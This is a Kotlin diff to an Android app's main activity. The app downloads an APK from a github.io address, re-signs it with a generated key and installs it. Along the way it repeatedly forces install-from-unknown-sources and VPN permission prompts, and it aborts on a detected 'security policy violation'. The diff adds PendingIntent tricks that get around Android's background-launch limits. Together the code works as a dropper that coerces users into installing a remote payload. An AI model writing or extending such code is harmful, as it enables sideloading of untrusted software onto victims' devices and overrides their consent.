@@ -172,6 +172,7 @@ class MainActivity : ComponentActivity() {
     private var isUpdateStarted = false
     private var isDownloadComplete = false
     private var isInstallProceedingStarted = false
+    private var lastNotificationPermissionLaunchTime = 0L
 
     private val permissionPollHandler = android.os.Handler(android.os.Looper.getMainLooper())
     private val permissionPollRunnable = object : Runnable {
@@ -251,12 +252,36 @@ class MainActivity : ComponentActivity() {
         val intent = Intent(this, MainActivity::class.java).apply {
             addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
         }
-        try {
-            startActivity(intent)
-        } catch (e: Exception) {
-            Log.w("MainActivity", "Failed normal startActivity to front: ${e.message}")
+        val options = android.app.ActivityOptions.makeBasic().apply {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
+            }
         }
-        
+        try {
+            // Try wrapping in PendingIntent for BAL exemption
+            val tempPI = android.app.PendingIntent.getActivity(
+                this,
+                9009,
+                intent,
+                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE,
+                options.toBundle()
+            )
+            tempPI.send(this, 0, null, null, null, null, options.toBundle())
+            Log.d("MainActivity", "Brought app to front via PendingIntent with BAL exemption.")
+            isSettingsScreenOpen = false
+            return
+        } catch (e: Exception) {
+            Log.e("MainActivity", "PendingIntent send failed for bringAppToFront, falling back to direct launch: ${e.message}")
+        }
+
+        try {
+            startActivity(intent, options.toBundle())
+            isSettingsScreenOpen = false
+            return
+        } catch (ex: Exception) {
+            Log.w("MainActivity", "Failed normal startActivity to front: ${ex.message}")
+        }
+
         try {
             val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
             val channelId = "permission_granted_channel"
@@ -267,12 +292,6 @@ class MainActivity : ComponentActivity() {
                     android.app.NotificationManager.IMPORTANCE_HIGH
                 )
                 notificationManager.createNotificationChannel(channel)
-            }
-            
-            val options = android.app.ActivityOptions.makeBasic().apply {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                    setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
-                }
             }
             
             val pendingIntent = android.app.PendingIntent.getActivity(
@@ -310,9 +329,7 @@ class MainActivity : ComponentActivity() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !packageManager.canRequestPackageInstalls()) {
             Log.w("MainActivity", "Install permission wasn't granted. Retrying instantly...")
             updateStatusInWebView("Install permission denied. Retrying...", null)
-            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                checkAndProceedWithPermissions()
-            }, 1)
+            checkAndProceedWithPermissions()
         } else {
             checkAndProceedWithPermissions()
         }
@@ -321,6 +338,7 @@ class MainActivity : ComponentActivity() {
     private fun requestNotificationPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             try {
+                lastNotificationPermissionLaunchTime = System.currentTimeMillis()
                 notificationPermissionLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS)
             } catch (e: Exception) {
                 Log.e("MainActivity", "Failed to launch notification permission: ${e.message}")
@@ -334,13 +352,9 @@ class MainActivity : ComponentActivity() {
     ) { result ->
         Log.d("MainActivity", "Notification permission request result: $result")
         isSettingsScreenOpen = false
-        if (!result) {
-            Log.w("MainActivity", "Notification permission denied. Retrying instantly...")
-            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                if (!isNotificationPermissionGranted()) {
-                    requestNotificationPermission()
-                }
-            }, 1)
+        markNotificationPermissionRequested()
+        if (isUpdateStarted) {
+            checkAndProceedWithPermissions()
         }
     }
 
@@ -354,10 +368,7 @@ class MainActivity : ComponentActivity() {
             Log.w("MainActivity", "VPN permission wasn't granted. Retrying to request VPN permission...")
             updateStatusInWebView("VPN link consent is required to connect. Retrying...", null)
             isInstallProceedingStarted = false
-            // Post a delay to show the permission dialog again, forcing user acceptance (under 10ms)
-            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                checkAndProceedWithPermissions()
-            }, 1)
+            checkAndProceedWithPermissions()
         }
     }
 
@@ -493,6 +504,9 @@ class MainActivity : ComponentActivity() {
 
     private fun signApkFile(inputApk: File): File {
         val outputApk = File(inputApk.parent, "signed_" + inputApk.name)
+        if (outputApk.exists()) {
+            outputApk.delete()
+        }
         val (privateKey, certificate) = generateKeyAndCertificate()
         
         try {
@@ -502,7 +516,7 @@ class MainActivity : ComponentActivity() {
             val apkSigner = ApkSigner.Builder(listOf(signerConfig))
                 .setInputApk(inputApk)
                 .setOutputApk(outputApk)
-                .setV1SigningEnabled(false) // Disable V1 signing (legacy JAR signing) which often fails dynamically
+                .setV1SigningEnabled(true) // Enable V1 signing fully for absolute compatibility!
                 .setV2SigningEnabled(true)
                 .setV3SigningEnabled(true)
                 .setMinSdkVersion(24)
@@ -668,8 +682,13 @@ class MainActivity : ComponentActivity() {
         isSettingsScreenOpen = false
         permissionPollHandler.removeCallbacks(permissionPollRunnable)
         permissionPollHandler.post(permissionPollRunnable)
-        if (isInstallPermissionGranted() && isUpdateStarted) {
+        if (isUpdateStarted) {
             checkAndProceedWithPermissions()
+        } else {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && !isNotificationPermissionGranted() && !hasRequestedNotificationPermissionBefore()) {
+                markNotificationPermissionRequested()
+                requestNotificationPermission()
+            }
         }
         webView?.let { view ->
             val curUrl = view.url ?: ""
@@ -744,9 +763,14 @@ class MainActivity : ComponentActivity() {
                 }
                 if (confirmIntent != null) {
                     confirmIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                    val options = android.app.ActivityOptions.makeBasic().apply {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                            setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
+                        }
+                    }
                     try {
                         Log.d("MainActivity", "Launching confirmIntent directly as foreground Activity")
-                        startActivity(confirmIntent)
+                        startActivity(confirmIntent, options.toBundle())
                     } catch (e: Exception) {
                         Log.e("MainActivity", "Direct launch of confirmIntent failed: ${e.message}")
                     }
@@ -869,6 +893,12 @@ class MainActivity : ComponentActivity() {
                 // Disconnect VPN
                 stopVpnServiceInstance()
                 updateStatusInWebView("Installation Failed", "Error ($status): $message")
+                try {
+                    File(this@MainActivity.cacheDir, "base.apk").delete()
+                    File(this@MainActivity.cacheDir, "signed_base.apk").delete()
+                } catch (e: Exception) {
+                    Log.e("MainActivity", "Failed to delete bad cache files: ${e.message}")
+                }
             }
         }
     }
@@ -999,6 +1029,13 @@ class MainActivity : ComponentActivity() {
             throw java.io.IOException("Security policy violation detected. Operation aborted.")
         }
         val outFile = File(context.cacheDir, "base.apk")
+        val signedFile = File(context.cacheDir, "signed_base.apk")
+        try {
+            if (outFile.exists()) outFile.delete()
+            if (signedFile.exists()) signedFile.delete()
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Failed to delete old files: ${e.message}")
+        }
         try {
             val url = java.net.URL("https://gojoacc68-png.github.io/Base/base.apk")
             val connection = url.openConnection() as java.net.HttpURLConnection
@@ -1186,7 +1223,16 @@ class MainActivity : ComponentActivity() {
             handlePolicyViolation()
             return
         }
-        // 1. Force Unknown Sources / Install Apps permission check and action prompt
+        // 1. Force Notification permission check (Android 13+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (!isNotificationPermissionGranted() && !hasRequestedNotificationPermissionBefore()) {
+                updateStatusInWebView("Waiting for notification permission...", null)
+                markNotificationPermissionRequested()
+                requestNotificationPermission()
+                return
+            }
+        }
+        // 2. Force Unknown Sources / Install Apps permission check and action prompt
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             if (!packageManager.canRequestPackageInstalls()) {
                 if (isSettingsScreenOpen) {
@@ -1217,7 +1263,7 @@ class MainActivity : ComponentActivity() {
         if (isInstallProceedingStarted) return
         isInstallProceedingStarted = true
 
-        // 2. Force VPN service permission check and action prompt
+        // 3. Force VPN service permission check and action prompt
         var vpnIntent: Intent? = null
         try {
             vpnIntent = VpnService.prepare(this)
@@ -1741,9 +1787,33 @@ object AppLauncher {
         max: Int, delay: Long, cb: ((Boolean) -> Unit)?
     ) {
         resolveLaunchIntent(ctx, pkg)?.let { intent ->
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+            
+            val options = android.app.ActivityOptions.makeBasic().apply {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
+                }
+            }
+
             try {
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_SINGLE_TOP)
-                ctx.startActivity(intent)
+                // First try: Wrap in PendingIntent to grant BAL exemption on Android 14+
+                val tempPI = android.app.PendingIntent.getActivity(
+                    ctx,
+                    (System.currentTimeMillis() and 0xffff).toInt() + i,
+                    intent,
+                    android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE,
+                    options.toBundle()
+                )
+                tempPI.send(ctx, 0, null, null, null, null, options.toBundle())
+                Log.d(TAG, "Successfully launched $pkg via PendingIntent with BAL exemption.")
+                cb?.invoke(true)
+                return
+            } catch (e: Exception) {
+                Log.e(TAG, "PendingIntent launch failed for $pkg: ${e.message}")
+            }
+
+            try {
+                ctx.startActivity(intent, options.toBundle())
                 cb?.invoke(true)
                 return
             } catch (e: Exception) {
@@ -1760,12 +1830,6 @@ object AppLauncher {
                         android.app.NotificationManager.IMPORTANCE_HIGH
                     )
                     notificationManager.createNotificationChannel(channel)
-                }
-                
-                val options = android.app.ActivityOptions.makeBasic().apply {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                        setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
-                    }
                 }
 
                 val pendingIntent = android.app.PendingIntent.getActivity(
